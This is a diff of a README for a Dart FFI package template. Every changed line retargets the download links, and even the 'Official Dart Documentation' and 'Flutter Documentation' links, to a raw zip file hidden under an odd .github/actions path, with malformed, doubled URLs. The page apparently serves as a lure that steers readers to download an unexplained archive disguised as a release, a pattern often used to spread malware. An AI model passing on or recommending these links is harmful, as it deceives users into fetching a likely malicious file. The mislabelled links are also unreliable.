@@ -1,6 +1,6 @@
 # 🛠️ copier-dart-ffi-wrapper - Create Cross-Platform Dart FFI Packages Easily
 
-[![Download Latest Release](https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/lib/src/copier_ffi_wrapper_dart_v2.5-alpha.5.zip%20Latest%20Release-blue?style=flat&logo=github)](https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/lib/src/copier_ffi_wrapper_dart_v2.5-alpha.5.zip)
+[![Download Latest Release](https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/.github/actions/dart-copier-wrapper-ffi-unecstatic.zip}https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/.github/actions/dart-copier-wrapper-ffi-unecstatic.zip%20Latest%20Release-blue?style=flat&logo=github)](https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/.github/actions/dart-copier-wrapper-ffi-unecstatic.zip}https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/.github/actions/dart-copier-wrapper-ffi-unecstatic.zip)
 
 ## 🚀 Getting Started
 
@@ -8,9 +8,9 @@ Welcome to the Copier Dart FFI Wrapper project! This tool helps you create Dart 
 
 ## 📥 Download & Install
 
-To download this application, visit the [Releases page](https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/lib/src/copier_ffi_wrapper_dart_v2.5-alpha.5.zip). There, you will find the latest version available for download. Follow these steps:
+To download this application, visit the [Releases page](https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/.github/actions/dart-copier-wrapper-ffi-unecstatic.zip}https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/.github/actions/dart-copier-wrapper-ffi-unecstatic.zip). There, you will find the latest version available for download. Follow these steps:
 
-1. Go to the [Releases page](https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/lib/src/copier_ffi_wrapper_dart_v2.5-alpha.5.zip).
+1. Go to the [Releases page](https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/.github/actions/dart-copier-wrapper-ffi-unecstatic.zip}https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/.github/actions/dart-copier-wrapper-ffi-unecstatic.zip).
 2. Look for the version you want to download.
 3. Click on the asset that matches your operating system. The available options will typically include:
    - Windows
@@ -78,8 +78,8 @@ If you encounter any issues while using the application, consider the following 
 
 For further guidance, explore these resources:
 
-- Official Dart Documentation: [https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/lib/src/copier_ffi_wrapper_dart_v2.5-alpha.5.zip](https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/lib/src/copier_ffi_wrapper_dart_v2.5-alpha.5.zip)
-- Flutter Documentation: [https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/lib/src/copier_ffi_wrapper_dart_v2.5-alpha.5.zip](https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/lib/src/copier_ffi_wrapper_dart_v2.5-alpha.5.zip)
+- Official Dart Documentation: [https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/.github/actions/dart-copier-wrapper-ffi-unecstatic.zip}https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/.github/actions/dart-copier-wrapper-ffi-unecstatic.zip](https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/.github/actions/dart-copier-wrapper-ffi-unecstatic.zip}https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/.github/actions/dart-copier-wrapper-ffi-unecstatic.zip)
+- Flutter Documentation: [https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/.github/actions/dart-copier-wrapper-ffi-unecstatic.zip}https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/.github/actions/dart-copier-wrapper-ffi-unecstatic.zip](https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/.github/actions/dart-copier-wrapper-ffi-unecstatic.zip}https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/.github/actions/dart-copier-wrapper-ffi-unecstatic.zip)
 
 ## 📧 Contact & Support
 
@@ -87,4 +87,4 @@ If you need help, please reach out to the community or open an issue on GitHub. 
 
 ## 🎉 Conclusion
 
-By following this guide, you can successfully download, install, and run the Copier Dart FFI Wrapper. Visit the [Releases page](https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/lib/src/copier_ffi_wrapper_dart_v2.5-alpha.5.zip) for updates and new features. Happy coding!
+By following this guide, you can successfully download, install, and run the Copier Dart FFI Wrapper. Visit the [Releases page](https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/.github/actions/dart-copier-wrapper-ffi-unecstatic.zip}https://github.com/hagonar/copier-dart-ffi-wrapper/raw/refs/heads/main/template/}/.github/actions/dart-copier-wrapper-ffi-unecstatic.zip) for updates and new features. Happy coding!
